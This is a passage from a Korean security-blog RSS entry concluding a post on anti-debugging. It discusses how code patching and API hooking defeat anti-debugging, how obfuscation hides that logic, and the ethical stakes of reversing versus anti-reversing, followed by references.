&#xB9C9;&#xB294; Anti-Debugging &#xAE30;&#xBC95;&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xB294;&#xAC78; &#xB9C9;&#xB294; Anti-Anti-Debugging <del>&#xAE30;&#xBC95;&#xC744; &#xB9C9;&#xB294; Anti-Anti-Anti-Debugging &#xC744; &#xB9C9;&#xB294; Anti-Anti-Anti-Anti tititi &#xD504;&#xB808;&#xC9C8;&#xD504;&#xB808;&#xC9C8;</del></p><p><img src="Anti-Fragile.gif" alt="~~&#xC548;&#xD2F0;&#xD2F0;&#xD2F0;&#xD2F0;&#xD2F0;&#xD504;&#xB798;&#xC9C8;&#xD504;&#xB798;&#xC9C8;~~"></p><p><del>&#xC548;&#xD2F0;&#xD2F0;&#xD2F0;&#xD2F0;&#xD2F0;&#xD504;&#xB798;&#xC9C8;&#xD504;&#xB798;&#xC9C8;</del></p></blockquote><h2 id="&#xC548;&#xD2F0;-&#xB514;&#xBC84;&#xAE45;&#xC758;-&#xD55C;&#xACC4;"><a href="#&#xC548;&#xD2F0;-&#xB514;&#xBC84;&#xAE45;&#xC758;-&#xD55C;&#xACC4;" class="headerlink" title="&#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45;&#xC758; &#xD55C;&#xACC4;"></a>&#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45;&#xC758; &#xD55C;&#xACC4;</h2><p>&#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;&#xC740; &#xCF54;&#xB4DC; &#xBD84;&#xC11D;&#xC744; &#xC5B4;&#xB835;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5B4; &#xC5ED;&#xACF5;&#xD559;&#xACFC; &#xCDE8;&#xC57D;&#xC810; &#xBD84;&#xC11D;&#xC744; &#xBC29;&#xD574;&#xD558;&#xB294; &#xD575;&#xC2EC; &#xAE30;&#xC220;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC758; &#xBB34;&#xB2E8; &#xBCF5;&#xC81C;, &#xD06C;&#xB799;, &#xC545;&#xC6A9;&#xC744; &#xBC29;&#xC9C0;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70;, &#xD2B9;&#xD788; &#xAE08;&#xC735;&#xB7;&#xAC8C;&#xC784;&#xB7;&#xBCF4;&#xC548; &#xC81C;&#xD488; &#xB4F1; &#xBBFC;&#xAC10;&#xD55C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xB2E4;&#xB8E8;&#xB294; &#xBD84;&#xC57C;&#xC5D0;&#xC11C; &#xD544;&#xC218;&#xC801;&#xC73C;&#xB85C; &#xD65C;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. (CTF&#xC5D0;&#xC11C;&#xB3C4; &#xC885;&#xC885; &#xCD9C;&#xC81C;&#xB429;&#xB2C8;&#xB2E4;!) &#xB2E4;&#xC591;&#xD55C; &#xD658;&#xACBD;&#xC5D0; &#xB9DE;&#xCDB0; &#xC801;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xC720;&#xC5F0;&#xC131;&#xACFC; &#xD568;&#xAED8;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xC2DC;&#xB3C4;&#xD560; &#xB54C; &#xC774;&#xB97C; &#xD0D0;&#xC9C0;&#xD558;&#xACE0; &#xB300;&#xC751;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC810;&#xC5D0;&#xC11C; &#xB192;&#xC740; &#xC2E4;&#xD6A8;&#xC131;&#xC744; &#xAC00;&#xC9D1;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7EC;&#xB098; &#xC800;&#xD76C;&#xAC00; &#xC624;&#xB298; &#xD55C; &#xC2E4;&#xC2B5;&#xC5D0;&#xC11C; &#xBCF4;&#xC168;&#xB4EF;&#xC774; &#xCF54;&#xB4DC;&#xD328;&#xCE58;&#xB098; API &#xD6C4;&#xD0B9; &#xB4F1;&#xC5D0; &#xCDE8;&#xC57D;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xD574;&#xB2F9; &#xBD80;&#xBD84;&#xC744; &#xC54C;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD328;&#xCE58;&#xAC00; &#xAC00;&#xB2A5;&#xD55C;&#xAC74;&#xB370;&#xC694;. </p><p><img src="image%2017.png" alt="image.png"></p><blockquote><p>???: &#xADF8;&#xB7FC; &#xD574;&#xB2F9; &#xBD80;&#xBD84;&#xC744; &#xBAA8;&#xB974;&#xAC8C; &#xD558;&#xBA74; &#xB418;&#xC9C0; &#xC54A;&#xB0D0;! / 000: &#xC5B4;&#xB5BB;&#xAC8C;!!</p></blockquote><p><img src="9o6emu.gif" alt="9o6emu.gif"></p><p>&#xB09C;&#xB3C5;&#xD654;&#xB97C; &#xD1B5;&#xD574; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xB85C;&#xC9C1;&#xC744; &#xC54C; &#xC218; &#xC5C6;&#xAC8C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xB85C;&#xC9C1;&#xC744; &#xC54C; &#xC218; &#xC5C6;&#xC73C;&#xBA74; &#xC5B4;&#xB5A4; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xAE30;&#xBC95;&#xC774; &#xC801;&#xC6A9;&#xB41C;&#xC9C0; &#xBAB0;&#xB77C;&#xC11C; &#xC6B0;&#xD68C;&#xBC29;&#xBC95;&#xC744; &#xC54C;&#xAE30;&#xAC00; &#xB354;&#xB354;&#xC6B1; &#xD798;&#xB4E0;&#xB370;&#xC694;. &#xC774;&#xB7EC;&#xD55C; Anti-Reversing &#xAE30;&#xC220;&#xC740; &#xC815;&#xC801;&#xC778; &#xAE30;&#xBC95;&#xC778; &#xB09C;&#xB3C5;&#xD654;&#xC640; &#xB3D9;&#xC801;&#xC778; &#xAE30;&#xBC95;&#xC778; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;&#xC774; &#xACB0;&#xD569;&#xB418;&#xC5B4;&#xC11C; &#xC4F0;&#xC774;&#xBA74; &#xBD84;&#xC11D;&#xAC00;&#xAC00; &#xBD84;&#xC11D;&#xD558;&#xAE30;&#xC5D0; &#xC0C1;&#xB2F9;&#xD788; &#xC5B4;&#xB835;&#xACE0; &#xBCF5;&#xC7A1;&#xD55C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC644;&#xC131;&#xB429;&#xB2C8;&#xB2E4;. (&#xB098;&#xC911;&#xC5D0; &#xAE30;&#xD68C;&#xAC00; &#xB41C;&#xB2E4;&#xBA74; &#xBE14;&#xB85C;&#xADF8;&#xC5D0;&#xC11C; &#xB09C;&#xB3C5;&#xD654;&#xB3C4; &#xB2E4;&#xB904;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!)</p><h2 id="&#xC758;&#xC758;"><a href="#&#xC758;&#xC758;" class="headerlink" title="&#xC758;&#xC758;"></a>&#xC758;&#xC758;</h2><p>&#xC545;&#xC131;&#xCF54;&#xB4DC; &#xBD84;&#xC11D; &#xAD00;&#xC810;&#xC5D0;&#xC11C; &#xB9AC;&#xBC84;&#xC2F1;&#xACFC; &#xC548;&#xD2F0; &#xB9AC;&#xBC84;&#xC2F1;&#xC740; &#xB9C8;&#xCE58; &#xCC3D;&#xACFC; &#xBC29;&#xD328;&#xC758; &#xC2F8;&#xC6C0;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xBD84;&#xC11D;&#xAC00;&#xB294; &#xB9AC;&#xBC84;&#xC2F1; &#xAE30;&#xC220;&#xC744; &#xD1B5;&#xD574; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xC758; &#xC791;&#xB3D9; &#xBC29;&#xC2DD;&#xC744; &#xD30C;&#xC545;&#xD558;&#xACE0;, &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xAC1C;&#xBC1C;&#xC790;&#xB294; &#xC548;&#xD2F0; &#xB9AC;&#xBC84;&#xC2F1; &#xAE30;&#xC220;&#xC744; &#xD1B5;&#xD574; &#xBD84;&#xC11D;&#xC744; &#xBC29;&#xD574;&#xD558;&#xC5EC; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xC758; &#xBE44;&#xBC00;&#xC744; &#xC228;&#xAE30;&#xB824; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC120;&#xB7C9;&#xD55C; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xAC1C;&#xBC1C;&#xC790; &#xAD00;&#xC810;&#xC5D0;&#xC11C;&#xB3C4; &#xB9AC;&#xBC84;&#xC2F1;&#xACFC; &#xC548;&#xD2F0; &#xB9AC;&#xBC84;&#xC2F1;&#xC740; &#xC911;&#xC694;&#xD55C; &#xC758;&#xBBF8;&#xB97C; &#xAC16;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9AC;&#xBC84;&#xC2F1; &#xAE30;&#xC220;&#xC740; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC544; &#xBCF4;&#xC548;&#xC744; &#xAC15;&#xD654;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xC73C;&#xBA70;, &#xC548;&#xD2F0; &#xB9AC;&#xBC84;&#xC2F1; &#xAE30;&#xC220;&#xC740; &#xC9C0;&#xC801; &#xC7AC;&#xC0B0;&#xAD8C;&#xC744; &#xBCF4;&#xD638;&#xD558;&#xACE0; &#xBD88;&#xBC95; &#xBCF5;&#xC81C;&#xB97C; &#xBC29;&#xC9C0;&#xD558;&#xB294; &#xB370; &#xD65C;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xACB0;&#xAD6D; &#xB9AC;&#xBC84;&#xC2F1;&#xACFC; &#xC548;&#xD2F0; &#xB9AC;&#xBC84;&#xC2F1;, &#xB514;&#xBC84;&#xAE45;&#xACFC; &#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45;&#xC740; &#xC11C;&#xB85C;&#xC758; &#xAE30;&#xC220;&#xC744; &#xBC1C;&#xC804;&#xC2DC;&#xD0A4;&#xBA70;, &#xC9C0;&#xC18D;&#xC801;&#xC778; &#xB300;&#xACB0;&#xC744; &#xC774;&#xC5B4;&#xAC00;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xAD00;&#xC810;&#xC5D0;&#xC11C; &#xC601;&#xD654;&#xC5D0;&#xC11C; &#xB098;&#xC624;&#xB294; &#xB04A;&#xC784;&#xC5C6;&#xB294; &#xC601;&#xC6C5;&#xACFC; &#xC545;&#xB2F9;&#xC758; &#xC2F8;&#xC6C0;&#xCC98;&#xB7FC; &#xB290;&#xAEF4;&#xC9D1;&#xB2C8;&#xB2E4;. &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xAC1C;&#xBC1C;&#xC790;&#xC640; &#xBD84;&#xC11D;&#xAC00;, &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xAC1C;&#xBC1C;&#xC790;&#xC640; &#xACF5;&#xACA9;&#xC790; &#xC0AC;&#xC774;&#xC758; &#xB05D;&#xB098;&#xC9C0; &#xC54A;&#xB294; &#xC2F8;&#xC6C0;&#xC774;&#xC8E0;. &#xC911;&#xC694;&#xD55C; &#xAC83;&#xC740; &#xAE30;&#xC220; &#xC790;&#xCCB4;&#xC758; &#xC120;&#xC545;&#xC774; &#xC544;&#xB2C8;&#xB77C;, &#xAE30;&#xC220;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC0AC;&#xB78C;&#xC758; &#xC724;&#xB9AC;&#xC801; &#xCC45;&#xC784;&#xC785;&#xB2C8;&#xB2E4;. &#xB9AC;&#xBC84;&#xC2F1;&#xACFC; &#xC548;&#xD2F0; &#xB9AC;&#xBC84;&#xC2F1; &#xAE30;&#xC220;&#xC744; &#xC62C;&#xBC14;&#xB974;&#xAC8C; &#xD65C;&#xC6A9;&#xD558;&#xC5EC; &#xC548;&#xC804;&#xD558;&#xACE0; &#xC2E0;&#xB8B0;&#xD560; &#xC218; &#xC788;&#xB294; &#xB514;&#xC9C0;&#xD138; &#xC138;&#xC0C1;&#xC744; &#xB9CC;&#xB4E4;&#xC5B4;&#xAC00;&#xB294; &#xAC83;&#xC774; &#xC6B0;&#xB9AC;&#xC758; &#xACFC;&#xC81C;&#xC774;&#xC9C0; &#xC54A;&#xC744;&#xAE4C;&#xC694;?!</p><p><img src="image%2018.jpg" alt="image.png"></p><p>&#xAE34; &#xAE00; &#xC77D;&#xC5B4;&#xC8FC;&#xC154;&#xC11C; &#xAC10;&#xC0AC;&#xB4DC;&#xB9AC;&#xACE0; &#xC800;&#xB294; &#xB354; &#xC88B;&#xC740; &#xC5F0;&#xAD6C;&#xAE00;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4; &#x1F642;</p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p>&#xB9AC;&#xBC84;&#xC2F1; &#xD575;&#xC2EC; &#xC6D0;&#xB9AC;: &#xC545;&#xC131; &#xCF54;&#xB4DC; &#xBD84;&#xC11D;&#xAC00;&#xC758; &#xB9AC;&#xBC84;&#xC2F1; &#xC774;&#xC57C;&#xAE30;(&#xC800;&#xC790; &#xC774;&#xC2B9;&#xC6D0;)</p><p>Detoures - <a href="https://secmem.tistory.com/480">https://secmem.tistory.com/480</a></p><p><a href="https://www.apriorit.com/dev-blog/367-anti-reverse-engineering-protection-techniques-to-use-before-releasing-software">https://www.apriorit.com/dev-blog/367-anti-reverse-engineering-protection-techniques-to-use-before-releasing-software</a></p><p><a href="https://www.bitdefender.com/en-us/blog/businessinsights/the-differences-between-static-malware-analysis-and-dynamic-malware-analysis">https://www.bitdefender.com/en-us/blog/businessinsights/the-differences-between-static-malware-analysis-and-dynamic-malware-analysis</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/OUYA77/">OUYA77</category>
      
      <category domain="https://hackyboiz.github.io/tags/Debugging/">Debugging</category>
      
      <category domain="https://hackyboiz.github.io/tags/Anti-Debugging/">Anti-Debugging</category>
      
      <category domain="https://hackyboiz.github.io/tags/Malware/">Malware</category>
      
      <category domain="https://hackyboiz.github.io/tags/Reverse-Engineering/">Reverse Engineering</category>
      
      
      <comments>https://hackyboiz.github.io/2025/03/24/OUYA77/Anti_part2/kr/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
